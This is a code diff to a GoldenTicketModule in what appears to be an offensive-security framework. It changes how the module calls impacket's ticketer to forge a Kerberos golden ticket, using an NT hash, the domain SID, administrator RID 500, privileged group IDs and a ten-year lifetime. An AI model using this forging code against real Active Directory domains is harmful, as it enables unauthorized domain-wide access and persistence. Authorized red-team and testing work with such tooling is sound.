@@ -184,53 +184,46 @@ class GoldenTicketModule(BaseModule):
                 # but call the internal class directly (not via subprocess)
                 try:
                     from impacket.examples.ticketer import TICKETER
-                    import tempfile as _tf
+                    from ares.core.security import secure_mkstemp
+                    dst, _fd2 = secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
+                    _os.close(_fd2)
 
-                    # Use a private tempdir so ticketer writes <username>.ccache
-                    # into an isolated directory — prevents CWD race condition when
-                    # two campaigns forge tickets for the same username simultaneously.
-                    tmp_dir = _tf.mkdtemp(prefix="ares_gt_")
-                    _os.chmod(tmp_dir, 0o700)  # owner-only before any credential written
-                    orig_cwd = _os.getcwd()
-                    try:
-                        _os.chdir(tmp_dir)
-                        ticketer = TICKETER(
-                            username,
-                            password="",
-                            domain=domain_upper,
-                            options={
-                                "nthash": nt_part,
-                                "aesKey": None,
-                                "domain_sid": domain_sid,
-                                "user_id": 500,
-                                "groups": "513,512,520,518,519",
-                                "duration": 3650,
-                                "extra_pac": False,
-                                "old_pac": False,
-                                "targetDomain": domain_upper,
-                                "dc_ip": None,
-                            }
-                        )
-                        ticketer.run()
-                        # ticketer writes <username>.ccache in cwd (now tmp_dir)
-                        src = _os.path.join(tmp_dir, f"{username}.ccache")
-                        if _os.path.exists(src):
-                            # Move to a stable temp path outside tmp_dir
-                            from ares.core.security import secure_mkstemp
-                            dst, _fd2 = secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
-                            _os.close(_fd2)
-                            import shutil as _shutil
-                            _shutil.move(src, dst)
-                            return True, dst, ""
-                        return False, "", "Ticket file not created"
-                    finally:
-                        _os.chdir(orig_cwd)
-                        # Cleanup temp dir (now empty after move)
-                        try:
-                            import shutil as _shutil2
-                            _shutil2.rmtree(tmp_dir, ignore_errors=True)
-                        except Exception:
-                            pass
+                    class _TicketerOptions:
+                        def __init__(self, **kwargs: Any) -> None:
+                            self.__dict__.update(kwargs)
+                        def __getattr__(self, name: str) -> Any:
+                            return self.__dict__.get(name)
+                        def __getitem__(self, item: str) -> Any:
+                            return self.__dict__.get(item)
+
+                    opts = _TicketerOptions(
+                        nthash=nt_part,
+                        aesKey=None,
+                        domain_sid=domain_sid,
+                        user_id=500,
+                        groups="513,512,520,518,519",
+                        duration=3650,
+                        extra_pac=False,
+                        old_pac=False,
+                        targetDomain=domain_upper,
+                        dc_ip=None,
+                        filename=dst,
+                    )
+                    ticketer = TICKETER(
+                        username,
+                        password="",
+                        domain=domain_upper,
+                        options=opts,
+                    )
+                    ticketer.run()
+                    if _os.path.exists(dst) and _os.path.getsize(dst) > 0:
+                        return True, dst, ""
+                    default_local = f"{username}.ccache"
+                    if _os.path.exists(default_local):
+                        import shutil as _shutil
+                        _shutil.move(default_local, dst)
+                        return True, dst, ""
+                    return False, "", "Ticket file not created"
                 except (ImportError, AttributeError, TypeError):
                     pass
 
